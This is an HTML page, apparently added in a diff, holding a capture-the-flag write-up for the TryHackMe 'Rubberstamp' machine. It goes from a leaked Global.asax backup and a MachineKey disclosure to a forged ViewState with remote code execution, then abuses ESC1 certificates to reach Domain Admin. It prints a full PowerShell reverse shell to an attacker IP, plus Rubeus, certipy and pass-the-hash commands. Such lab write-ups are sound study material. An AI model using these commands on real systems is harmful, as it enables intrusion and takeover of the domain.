@@ -1,0 +1,188 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Rubberstamp — From a Backup File to Domain Admin</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <style>
+    :root{color-scheme:dark;--bg:#0d0f14;--panel:#13161d;--text:#e6e9f0;--muted:#9aa3b5;--line:#272c38;--accent:#7c83ff;--code:#0a0c10}
+    *{box-sizing:border-box}html{scroll-behavior:smooth}body{margin:0;background:var(--bg);color:var(--text);font-family:Inter,system-ui,sans-serif;line-height:1.72}
+    article{width:min(780px,calc(100% - 40px));margin:0 auto;padding:72px 0 120px}
+    .eyebrow{color:var(--accent);font-size:.76rem;font-weight:800;letter-spacing:.12em;text-transform:uppercase}.lead{color:var(--muted);font-size:1.1rem}
+    h1{font-size:clamp(2.35rem,7vw,4.5rem);line-height:1.02;letter-spacing:-.055em;margin:.25em 0 .35em}h2{font-size:1.7rem;margin:2.4em 0 .6em;letter-spacing:-.025em}h3{font-size:1.15rem;margin:2em 0 .55em}
+    p{margin:0 0 1.15em}code,pre{font-family:"JetBrains Mono",monospace}code{font-size:.88em;background:#1b1f29;padding:.14em .38em;border-radius:5px}
+    pre{position:relative;margin:1.15em 0 1.35em;padding:18px 20px;background:var(--code);border:1px solid var(--line);border-radius:12px;color:#d7dae2;line-height:1.62;white-space:pre-wrap;overflow-wrap:anywhere;font-size:.84rem}
+    .note{margin:1.25em 0 1.65em;padding:15px 17px;border-left:3px solid var(--accent);background:var(--panel);border-radius:0 10px 10px 0;color:#cdd2df}
+    .facts{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:1px;margin:28px 0;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden}.fact{background:var(--panel);padding:14px 16px}.fact b{display:block;font-size:.7rem;color:var(--muted);text-transform:uppercase;letter-spacing:.08em}.fact span{font-family:"JetBrains Mono";font-size:.87rem}
+    ul,ol{padding-left:1.3em}li{margin:.35em 0}.result{color:#87d7a5}.warning{color:#f0bd75}hr{border:0;border-top:1px solid var(--line);margin:3em 0}.source{font-size:.8rem;color:var(--muted)}a{color:#9ca2ff}
+    @media(max-width:620px){article{width:min(100% - 28px,780px);padding-top:42px}.facts{grid-template-columns:1fr}pre{font-size:.76rem;padding:15px}}
+  </style>
+</head>
+<body>
+<article>
+  <div class="eyebrow">TryHackMe · Windows · Active Directory</div>
+  <h1>Rubberstamp — From a Backup File to Domain Admin</h1>
+  <p class="lead">I chained a small information disclosure issue in a legacy ASP.NET application into remote code execution, then abused Active Directory Certificate Services to take over the domain.</p>
+
+  <div class="facts">
+    <div class="fact"><b>Target</b><span>10.80.169.60</span></div><div class="fact"><b>Hostname</b><span>SRV01.rubberstamp.local</span></div>
+    <div class="fact"><b>Domain</b><span>rubberstamp.local</span></div><div class="fact"><b>OS</b><span>Windows Server 2019</span></div>
+  </div>
+
+  <h2>Overview</h2>
+  <p>Rubberstamp is a Windows Active Directory machine where no single issue is enough on its own. I had to connect a leaked backup file, an ASP.NET debugging mistake, forged ViewState data, and a vulnerable certificate template into one complete attack path.</p>
+
+  <h2>Reconnaissance</h2>
+  <p>I started with a full TCP scan so I could identify every exposed service and understand the role of the host.</p>
+  <pre>sudo nmap -sS -sCV -p- 10.80.169.60 -Pn --min-rate 1000</pre>
+  <div class="note">From the results, I identified IIS on port 80, SMB on 445, LDAP on 389, RDP on 3389, and Kerberos on 88. The combination of LDAP and Kerberos told me this was a domain controller, while IIS gave me an immediate web attack surface.</div>
+  <pre>[aspx-debug-mode] [medium] http://10.80.169.60/Foobar-debug.aspx
+[iis-shortname-detect] [info] http://10.80.169.60/*~1*/a.aspx
+[smb-enum] [info] DNSComputerName: SRV01.rubberstamp.local
+[ldap-metadata] [info] ForestName: rubberstamp.local</pre>
+  <p>I followed up with Nuclei to fingerprint common weaknesses. The ASP.NET debug finding and IIS short-name behavior made the web application worth investigating more closely.</p>
+  <pre>http://10.80.169.60/legacy/RequestStatus.aspx</pre>
+  <p>Katana exposed this legacy endpoint. I treated the <code>/legacy/</code> path as a strong lead because old application code often contains forgotten functionality and weaker validation.</p>
+
+  <h2>Web Application Enumeration</h2>
+  <h3>Parameter discovery</h3>
+  <p>I fuzzed the query-string parameter names to see whether the endpoint accepted undocumented input.</p>
+  <pre>ffuf -u "http://10.80.169.60/legacy/RequestStatus.aspx?FUZZ=1" \
+  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt \
+  -fs 164 -fw 6</pre>
+  <p>The parameters <code>id</code>, <code>Id</code>, and <code>ID</code> produced responses that differed from the baseline. Testing valid values showed that the page was loading request records from a database.</p>
+  <pre>id=1  → REQ-1 | approved
+id=2  → REQ-2 | approved</pre>
+
+  <h3>SQL injection probe</h3>
+  <p>I inserted a single quote to deliberately break the backend query and observe how the application handled the error.</p>
+  <pre>curl "http://10.80.169.60/legacy/RequestStatus.aspx?id='"</pre>
+  <p>The server redirected me to its error page, which confirmed that my input was reaching a fragile SQL query. Automated exploitation was unreliable because of the changing ViewState and the application’s generic filtering, so I continued enumerating for a cleaner entry point.</p>
+
+  <h3>Finding the backup file</h3>
+  <pre>http://10.80.169.60/global.asax.bak</pre>
+  <p>Feroxbuster uncovered a publicly readable backup of <code>Global.asax</code>. This was the key discovery because the file revealed exactly how the application’s custom error handler worked.</p>
+  <pre>void Application_Error(object sender, EventArgs e)
+{
+    if (!context.Request.Path.StartsWith("/legacy/", ...)) return;
+    if (context.Request.QueryString["debug"] != "true") return;
+    var ex = context.Server.GetLastError();
+    var mk = (MachineKeySection)ConfigurationManager
+                .GetSection("system.web/machineKey");
+    context.Response.Write("&lt;pre&gt;" + ex.ToString() +
+        "\n\nvalidationKey=" + mk.ValidationKey +
+        "\ndecryptionKey=" + mk.DecryptionKey +
+        "\nvalidation=" + mk.Validation + "&lt;/pre&gt;");
+}</pre>
+  <div class="note">Reading the code showed me that any unhandled exception under <code>/legacy/</code>, when paired with <code>debug=true</code>, would print the application’s MachineKey material. I now had a direct way to turn the earlier SQL error into a cryptographic secret leak.</div>
+
+  <h2>Leaking the MachineKey</h2>
+  <p>I combined the malformed <code>id</code> value with the debug flag to intentionally trigger the vulnerable error handler.</p>
+  <pre>curl "http://10.80.169.60/legacy/RequestStatus.aspx?id='&amp;debug=true"</pre>
+  <pre>System.FormatException: Input string was not in a correct format.
+validationKey=D7D2FA8B5C1E4A9F3B6C8D0E2F4A6B8C1D3E5F7A9B1C3D5E7F9A1B3C5D7E9F1A
+decryptionKey=A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F4
+validation=SHA1</pre>
+  <p class="result">The response exposed both keys and the validation algorithm. With those values, I could create a ViewState payload that the server would accept as authentic.</p>
+
+  <h2>Forging a malicious ViewState</h2>
+  <p>ASP.NET 4.5 and later derive page-specific keys instead of signing ViewState directly with the raw MachineKey. My initial signatures failed, so I reproduced the SP800-108 derivation using the page’s virtual path and type as the purpose values.</p>
+  <pre>from badsecrets.base import carve_all_modules
+
+lbl, ctx = sp800_108_get_key_derivation_parameters(
+    "WebForms.HiddenFieldPageStatePersister.ClientState",
+    ["TemplateSourceDirectory: /LEGACY",
+     "Type: LEGACY_REQUESTSTATUS_ASPX"])
+dekey = sp800_108_derivekey(EKEY, lbl, ctx, len(EKEY)*8)
+dvkey = sp800_108_derivekey(VKEY, lbl, ctx, len(VKEY)*8)</pre>
+  <div class="note">I used the derived encryption and validation keys to make the payload page-specific. This explains why a generic ViewState generator or a simple HMAC with the raw MachineKey was rejected.</div>
+  <ol>
+    <li>I generated a serialized <code>SortedSet&lt;string&gt;</code> TypeConfuseDelegate gadget with ysoserial.net.</li>
+    <li>I replaced the embedded command and corrected its variable-length length fields.</li>
+    <li>I encrypted the serialized data with AES-CBC using the derived decryption key.</li>
+    <li>I signed the IV and ciphertext with HMAC-SHA1 using the derived validation key.</li>
+    <li>I Base64-encoded the final value and sent it as <code>__VIEWSTATE</code>.</li>
+  </ol>
+
+  <h3>Confirming code execution</h3>
+  <pre># My callback listener received a request from the target:
+10.80.169.60 → "GET /callback HTTP/1.1" 404</pre>
+  <p>I first used a harmless web callback as proof of execution. The request reached my server, confirming that the serialized command ran on the target.</p>
+  <pre>System.InvalidCastException: Unable to cast object of type
+'System.Collections.Generic.SortedSet`1[System.String]' to type
+'System.Web.UI.Pair'.</pre>
+  <p>This exception was useful evidence rather than a failure. The TypeConfuseDelegate gadget executes during deserialization, before ASP.NET attempts the final cast to <code>Pair</code>, so my command had already run.</p>
+
+  <h3>Getting a shell</h3>
+  <pre>rlwrap nc -lvnp 4444</pre>
+  <p>I started my listener first, then changed the forged payload’s command to a PowerShell reverse shell.</p>
+  <pre>powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('&lt;ATTACKER_IP&gt;',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2&gt;&amp;1|Out-String);$rb=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length)}"</pre>
+  <pre>whoami
+rubberstamp\svc-iisweb</pre>
+  <p class="result">The target connected back as <code>rubberstamp\svc-iisweb</code>. I collected the user flag, then checked privileges and found no useful impersonation right, so the usual Potato-style local escalation path was unavailable.</p>
+
+  <h2>Pivoting into Active Directory Certificate Services</h2>
+  <pre>whoami /groups
+BUILTIN\Certificate Service DCOM Access  S-1-5-32-574</pre>
+  <p>The group membership told me that Active Directory Certificate Services was present in the environment. I confirmed the certificate authority with <code>certutil</code>.</p>
+  <pre>CA Name: rubberstamp-SRV01-CA
+Machine Name: SRV01.rubberstamp.local
+Enterprise Root CA</pre>
+  <p>The domain controller was also the certificate authority. That made AD CS enumeration the most promising escalation route.</p>
+
+  <h3>Exporting a usable Kerberos ticket</h3>
+  <pre>Rubeus.exe dump /service:krbtgt /nowrap</pre>
+  <p class="warning">My first attempt returned a ticket with an all-zero session key. Although it looked like a ticket, it could not create a valid authenticator and was therefore unusable from my Linux host.</p>
+  <pre>Rubeus.exe tgtdeleg /nowrap</pre>
+  <p>I switched to <code>tgtdeleg</code>, which used a delegation flow through SSPI to recover a TGT containing its real session key without requiring elevated privileges.</p>
+  <pre>echo "&lt;base64&gt;" | base64 -d &gt; svc-iisweb.kirbi
+ticketConverter.py svc-iisweb.kirbi svc-iisweb.ccache
+export KRB5CCNAME=$(pwd)/svc-iisweb.ccache
+klist</pre>
+  <p>I converted the exported ticket to a ccache, pointed my Kerberos tooling at it, and verified that the TGT loaded correctly.</p>
+
+  <h3>Enumerating certificate templates</h3>
+  <pre>certipy find -k -no-pass \
+  -u svc-iisweb@rubberstamp.local \
+  -dc-ip 10.80.169.60 \
+  -target srv01.rubberstamp.local \
+  -vulnerable</pre>
+  <div class="note">I used the domain controller’s hostname for <code>-target</code> so Certipy could construct the correct LDAP SPN. Pointing that option at only the domain name had previously caused an <code>invalidCredentials</code> bind error even though my ticket was valid.</div>
+  <pre>Template Name              : PrivClientAuth
+Enrollee Supplies Subject  : True
+Client Authentication      : True
+[+] User Enrollable Principals : RUBBERSTAMP.LOCAL\Domain Users
+[!] Vulnerabilities
+    ESC1 : Enrollee supplies subject and template allows client authentication.</pre>
+  <p>The <code>PrivClientAuth</code> template was vulnerable to ESC1. Because Domain Users could enroll, supply an arbitrary identity, and receive a client-authentication certificate, my service account could request a certificate as the domain administrator.</p>
+
+  <h2>Exploiting ESC1 to become Domain Admin</h2>
+  <pre>certipy req -k -no-pass \
+  -u svc-iisweb@rubberstamp.local \
+  -dc-ip 10.80.169.60 \
+  -dc-host srv01.rubberstamp.local \
+  -target srv01.rubberstamp.local \
+  -ca rubberstamp-SRV01-CA \
+  -template PrivClientAuth \
+  -upn administrator@rubberstamp.local</pre>
+  <p>The CA issued <code>administrator.pfx</code>, giving me a certificate that represented the Administrator account.</p>
+  <pre>certipy auth \
+  -pfx administrator.pfx \
+  -dc-ip 10.80.169.60 \
+  -username administrator \
+  -domain rubberstamp.local</pre>
+  <pre>Got hash for 'administrator@rubberstamp.local':
+aad3b435b51404eeaad3b435b51404ee:&lt;REDACTED&gt;</pre>
+  <p>I authenticated with the certificate through PKINIT and recovered the Administrator NTLM hash.</p>
+  <pre>evil-winrm -i 10.80.169.60 -u administrator -H &lt;REDACTED&gt;</pre>
+  <p class="result">I passed the hash with Evil-WinRM and obtained full Administrator access on the domain controller. From there, I collected the root flag and completed the machine.</p>
+
+  <hr>
+  <p><strong>Final chain:</strong> exposed backup file → debug MachineKey disclosure → forged ASP.NET ViewState → RCE as <code>svc-iisweb</code> → usable Kerberos TGT → ESC1 certificate abuse → Domain Administrator.</p>
+  <p class="source">Local presentation of the Rubberstamp writeup. Flags and sensitive hash material remain redacted.</p>
+</article>
+</body>
+</html>
